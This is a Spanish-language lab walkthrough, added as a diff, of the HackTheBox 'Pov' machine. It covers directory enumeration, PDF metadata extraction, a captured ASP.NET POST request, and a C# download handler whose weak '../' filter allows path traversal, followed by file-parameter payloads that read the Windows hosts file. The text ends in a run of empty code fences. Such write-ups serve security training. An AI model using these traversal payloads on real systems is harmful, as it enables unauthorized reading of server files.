@@ -128,3 +128,130 @@ Obtenemos
 http://dev.pov.htb [302 Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.108.177], Microsoft-IIS[10.0], RedirectLocation[http://dev.pov.htb/portfolio/], Title[Document Moved], X-Powered-By[ASP.NET]
 http://dev.pov.htb/portfolio/ [200 OK] ASP_NET[4.0.30319], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.108.177], JQuery[3.4.1], Meta-Author[Devcrud], Microsoft-IIS[10.0], Script, Title[dev.pov.htb], X-Powered-By[ASP.NET]
 ```
+https://infosecmachines.io
+navegamos a  http://dev.pov.htb/portfolio
+
+```
+
+
+```bash
+echo "10.129.185.102   dev.pov.htb" >> /etc/hosts
+gobuster dir -u http://dev.pov.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x aspx
+gobuster dir -u http://dev.pov.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x aspx --exclude-length 188
+```
+
+Y obtenemos 302, es decir todo redirecciona. mas info en https://http.cat/
+
+```bash
+gobuster dir -u http://dev.pov.htb/portfolio -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x | grep -v "302"
+```
+y obtenemos algunos directorios al cual navegamos por contact.aspx y default.aspx
+
+```bash
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/contact.aspx         (Status: 200) [Size: 4691]
+/default.aspx         (Status: 200) [Size: 21371]
+/Default.aspx         (Status: 200) [Size: 21371]
+/assets               (Status: 301) [Size: 159] [--> http://dev.pov.htb/portfolio/assets/]
+/Contact.aspx         (Status: 200) [Size: 4691]
+/Assets               (Status: 301) [Size: 159] [--> http://dev.pov.htb/portfolio/Assets/]
+```
+Descargamos el cv y analizamos los metadatos, tenemos en cuenta el nombre del usuario por si sea necesario.
+```bash
+┌─[root@htb-adqnh87wfy]─[/home/outlanderlat/Downloads]
+└──╼ #exiftool cv.pdf 
+ExifTool Version Number         : 12.57
+File Name                       : cv.pdf
+Directory                       : .
+File Size                       : 148 kB
+File Modification Date/Time     : 2024:06:26 17:07:00-05:00
+File Access Date/Time           : 2024:06:26 17:07:00-05:00
+File Inode Change Date/Time     : 2024:06:26 17:07:00-05:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.7
+Linearized                      : No
+Page Count                      : 1
+Language                        : es
+Tagged PDF                      : Yes
+XMP Toolkit                     : 3.1-701
+Producer                        : Microsoft® Word para Microsoft 365
+Creator                         : Turbo
+Creator Tool                    : Microsoft® Word para Microsoft 365
+Create Date                     : 2023:09:15 12:47:15-06:00
+Modify Date                     : 2023:09:15 12:47:15-06:00
+Document ID                     : uuid:3046DD6C-A619-4073-9589-BE6776F405F2
+Instance ID                     : uuid:3046DD6C-A619-4073-9589-BE6776F405F2
+Author                          : Turbo
+
+```
+Vamos a analizar con burbsuite los parametros que se envian. Al ser un IS los datos que estan en base64 y forma serializada no se pueden alterar, y lo mas interesante es el campo file=cv.pf podemos intentar poner la ruta de otro archivo, 
+
+```bash
+POST /portfolio/ HTTP/1.1
+Host: dev.pov.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://dev.pov.htb/portfolio/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 357
+Origin: http://dev.pov.htb
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=trcOk8TIs76tiflYimAQ1oYz2NoLl4kVSUYEj%2BOntg5k8qx4Nm2e0e%2Fmp%2FPGZBgSb3iMHpgWJwxC3ZLwcmZ%2BpPiU5Qw%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=vbnHgOARiUCUU42ZGjbprRqOq6O5ObtrthU79l7HTPQLB4RVOAurebcJApvQU6wdqHeOW0XV4AUhDTADmcCgYU6rx2jLWHzJqpl4NWNAbZ2LP%2Bb8JBdRVeAP9sGHD2acXLUKgQ%3D%3D&file=cv.pdf
+```
+Enviamos el repeater y intentamos acceder al archivo default.aspx y en el codigo observamos un archivo index.aspx.cs ingresamos a este y analizamos el codigo
+```css
+using System;
+using System.Collections.Generic;
+using System.Web;
+using System.Web.UI;
+using System.Web.UI.WebControls;
+using System.Text.RegularExpressions;
+using System.Text;
+using System.IO;
+using System.Net;
+
+public partial class index : System.Web.UI.Page {
+    protected void Page_Load(object sender, EventArgs e) {
+
+    }
+    
+    protected void Download(object sender, EventArgs e) {
+            
+        var filePath = file.Value;
+        filePath = Regex.Replace(filePath, "../", "");
+        Response.ContentType = "application/octet-stream";
+        Response.AppendHeader("Content-Disposition","attachment; filename=" + filePath);
+        Response.TransmitFile(filePath);
+        Response.End();
+        
+    }
+}
+```
+en la variable filePath encontramos una medidad de seguridad para evitar ir varias rutas hacia atras (directory path transversal) con el formato ../ pero tenemos varias formas de variar esto por ejemplo:
+
+```bash
+file=..\..\..\..\..\windows\System32\Drives\etc\hosts
+file=../../../../../windows/System32/Drives/etc/hosts
+file=c:\Windows\System32\Drivers\etc\hosts
+```
+El ultimo si funciona, con la ruta directa.
+```bash```bash
+```bash
+```bash
+```bash
+```bash
+```bash
+```bash
+```bash
+```bash
